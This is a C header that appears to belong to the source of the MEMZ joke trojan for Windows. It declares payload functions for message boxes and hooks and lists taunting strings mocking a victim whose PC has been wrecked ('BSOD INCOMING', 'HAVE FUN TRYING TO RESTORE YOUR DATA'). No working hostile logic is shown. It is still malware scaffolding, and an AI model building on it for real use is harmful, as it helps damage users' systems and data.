#pragma once
#define PAYLOADFUNC int times, int runtime, BOOLEAN skip
#define PAYLOADHEAD if (skip) goto out;

#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <CommCtrl.h>

int payloadMessageBox(PAYLOADFUNC);
DWORD WINAPI messageBoxThread(LPVOID);
DWORD WINAPI ripMessageThread(LPVOID);
LRESULT CALLBACK msgBoxHook(int, WPARAM, LPARAM);
int random();



const char* msgs[] = 
{
	"YOU KILLED MY TROJAN!\r\nEqual you killed yourself£¡ :D",
	"REST IN PISS, FOREVER MISS.",
	"I WARNED YOU...",
	"HAHA N00B L2P G3T R3KT",
	"You failed at your 1337 h4x0r skillz.",
	"YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STILL FUCKED!",
	"HACKER!\r\nENJOY BAN!",
	"GET BETTER HAX NEXT TIME xD",
	"HAVE FUN TRYING TO RESTORE YOUR DATA :D",
	"|\\/|3|\\/|2",
	"BSOD INCOMING",
	"VIRUS PRANK (GONE WRONG)",
	"ENJOY THE NYAN CAT",
	"Get dank antivirus m9!",
	"You are an idiot!\r\nHA HA HA HA HA HA HA",
	"#MakeMalwareGreatAgain",
	"SOMEBODY ONCE TOLD ME THE MEMZ ARE GONNA ROLL ME",
	"Why did you even tried to kill MEMZ?\r\nYour PC is fucked anyway.",
	"SecureBoot sucks.",
	"gr8 m8 i r8 8/8",
	"Have you tried turning it off and on again?",
	"<Insert Joel quote here>",
	"Greetings to all GAiA members!",
	"Well, hello there. I don't believe we've been properly introduced. I'm Bonzi!",
	"'This is everything I want in my computer'\r\n - danooct1 2016",
	"'Uh, Club Penguin. Time to get banned!'\r\n - danooct1 2016",
};

const size_t nMsgs = sizeof(msgs) / sizeof(void*);